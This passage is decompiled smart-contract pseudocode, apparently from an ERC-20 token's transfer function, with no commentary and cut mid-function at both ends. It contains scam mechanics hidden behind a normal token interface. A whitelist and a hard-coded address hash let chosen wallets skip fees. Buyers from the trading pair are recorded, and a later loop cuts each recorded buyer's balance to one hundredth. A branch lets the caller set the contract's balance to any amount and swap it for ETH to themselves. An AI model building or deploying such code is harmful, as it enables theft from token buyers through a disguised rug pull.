                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _12223 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12223 + 32 len mem[_12223]]):
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if this.address == arg1:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 0, 17
                                                        if not arg2:
                                                            revert with 0, 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 0, 17
                                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                                            revert with 0, 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                            revert with 0, 17
                                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
        else:
            if arg1 == msg.sender:
                if not this.address:
                    revert with 0, 'IERC20: approve from the zero address'
                if not stor10:
                    revert with 0, 'IERC20: approve to the zero address'
                allowance[address(this.address)][stor10] = arg2
                emit Approval(arg2, this.address, stor10);
                balanceOf[this.address] = arg2
                mem[180] = this.address
                require ext_code.size(stor10)
                staticcall stor10.WETH() with:
                        gas gas_remaining wei
                mem[244] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[212] = ext_call.return_data[12 len 20]
                stor18 = 1
                if 20 > !block.timestamp:
                    revert with 0, 17
                mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                mem[ceil32(return_data.size) + 248] = arg2
                idx = 0
                s = ceil32(return_data.size) + 440
                t = 180
                while idx < 2:
                    mem[s] = mem[t + 12 len 20]
                    idx = idx + 1
                    s = s + 32
                    t = t + 32
                    continue 
                require ext_code.size(stor10)
                call stor10.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                     gas gas_remaining wei
                    args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                stor18 = 0
            else:
                if stor18:
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    mem[148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    mem[ceil32(return_data.size) + 148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    mem[(2 * ceil32(return_data.size)) + 152] = this.address
                    mem[(2 * ceil32(return_data.size)) + 184] = address(ext_call.return_data[0])
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    mem[(2 * ceil32(return_data.size)) + 148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    mem[64] = (4 * ceil32(return_data.size)) + 148
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if ext_call.return_data[12 len 20] != msg.sender:
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0])
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if arg1 == ext_call.return_data[12 len 20]:
                            if stor16[address(msg.sender)]:
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(arg1):
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if this.address == arg1:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor18:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if not arg2:
                                    require arg2 <= _maxTxAmount
                                    require ext_code.size(stor10)
                                    staticcall stor10.factory() with:
                                            gas gas_remaining wei
                                    mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                    require ext_code.size(stor10)
                                    staticcall stor10.WETH() with:
                                            gas gas_remaining wei
                                           args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                    mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                    require ext_code.size(address(ext_call.return_data[0]))
                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                            gas gas_remaining wei
                                           args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    if ext_call.return_data[12 len 20] == arg1:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2,
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      arg1,
                                        return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                    stor19.length++
                                    stor19[stor19.length].field_0 = arg1
                                    stor66DE[stor19.length] = arg2
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                else:
                                    if arg2 and _fee > -1 / arg2:
                                        revert with 0, 17
                                    if not arg2:
                                        revert with 0, 18
                                    if arg2 * _fee / arg2 != _fee:
                                        revert with 0, 'SafeMath: multiplication overflow'
                                    require arg2 <= _maxTxAmount
                                    require ext_code.size(stor10)
                                    staticcall stor10.factory() with:
                                            gas gas_remaining wei
                                    mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                    require ext_code.size(stor10)
                                    staticcall stor10.WETH() with:
                                            gas gas_remaining wei
                                           args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                    mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                    require ext_code.size(address(ext_call.return_data[0]))
                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                            gas gas_remaining wei
                                           args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    if ext_call.return_data[12 len 20] == arg1:
                                        if arg2 < arg2 * _fee / 100:
                                            revert with 0, 17
                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                            revert with 0, 17
                                        balanceOf[0] += arg2 * _fee / 100
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                            revert with 0, 17
                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 - (arg2 * _fee / 100),
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      arg1,
                                        if arg2 * _fee / 100:
                                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                                          arg2 * _fee / 100,
                                                          mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                          msg.sender,
                                                          0,
                                        return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                    stor19.length++
                                    stor19[stor19.length].field_0 = arg1
                                    stor66DE[stor19.length] = arg2
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 0, 17
                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                        revert with 0, 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                        revert with 0, 17
                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                return 1, mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)]
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0])
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if stor16[address(arg1)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(arg1):
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if this.address == arg1:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if ext_call.return_data[12 len 20] != msg.sender:
                            if msg.sender == address(ext_call.return_data[0]):
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                        else:
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                        if stor18:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if not arg2:
                            require arg2 <= _maxTxAmount
                            require ext_code.size(stor10)
                            staticcall stor10.factory() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(stor10)
                            staticcall stor10.WETH() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[(15 * ceil32(return_data.size)) + 268] = this.address
                            mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                            require ext_code.size(address(ext_call.return_data[0]))
                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            if ext_call.return_data[12 len 20] == arg1:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                            stor19.length++
                            stor19[stor19.length].field_0 = arg1
                            stor66DE[stor19.length] = arg2
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                        else:
                            if arg2 and _fee > -1 / arg2:
                                revert with 0, 17
                            if not arg2:
                                revert with 0, 18
                            if arg2 * _fee / arg2 != _fee:
                                revert with 0, 'SafeMath: multiplication overflow'
                            require arg2 <= _maxTxAmount
                            require ext_code.size(stor10)
                            staticcall stor10.factory() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(stor10)
                            staticcall stor10.WETH() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[(15 * ceil32(return_data.size)) + 268] = this.address
                            mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                            require ext_code.size(address(ext_call.return_data[0]))
                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            if ext_call.return_data[12 len 20] == arg1:
                                if arg2 < arg2 * _fee / 100:
                                    revert with 0, 17
                                if balanceOf[0] > !(arg2 * _fee / 100):
                                    revert with 0, 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                    revert with 0, 17
                                balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                                return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                            stor19.length++
                            stor19[stor19.length].field_0 = arg1
                            stor66DE[stor19.length] = arg2
                            if arg2 < arg2 * _fee / 100:
                                revert with 0, 17
                            if balanceOf[0] > !(arg2 * _fee / 100):
                                revert with 0, 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                revert with 0, 17
                            balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                        return 1, mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)]
                    idx = 0
                    while idx < stor19.length:
                        mem[0] = stor19[idx].field_0
                        mem[32] = 13
                        _7736 = mem[64]
                        mem[64] = mem[64] + 64
                        mem[_7736] = 26
                        mem[_7736 + 32] = 'SafeMath: division by zero'
                        if idx >= stor19.length:
                            revert with 0, 50
                        mem[0] = stor19[idx].field_0
                        mem[32] = 13
                        balanceOf[stor19[idx].field_0] = balanceOf[stor19[idx].field_0] / 100
                        if idx == -1:
                            revert with 0, 17
                        idx = idx + 1
                        continue 
                    stor19.length = 0
                    mem[0] = 19
                    idx = 0
                    while 2 * stor19.length > idx:
                        stor19[idx].field_0 = 0
                        stor19[idx].field_256 = 0
                        idx = idx + 2
                        continue 
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11544 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
